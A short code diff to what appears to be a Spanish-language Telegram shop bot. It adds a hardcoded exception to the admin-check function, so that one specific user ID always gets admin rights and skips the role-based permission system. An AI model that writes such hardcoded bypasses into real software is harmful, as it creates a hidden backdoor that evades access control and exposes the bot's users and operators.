@@ -10,11 +10,12 @@ from src.database.database import (
 
 #region FUNCIONES AUXILIARES
 
-
 async def verificar_admin(user_id: int, update: Update) -> bool:
     """Check if user is admin via internal role system (role >= 2)."""
+    # Si eres tú (Kiu), el bot te deja pasar siempre
+    if user_id == 7745029153:
+        return True
     return check_permission(user_id, 2)
-
 
 def obtener_gif_aleatorio(nombre_producto):
     nombre_carpeta = nombre_producto.lower()
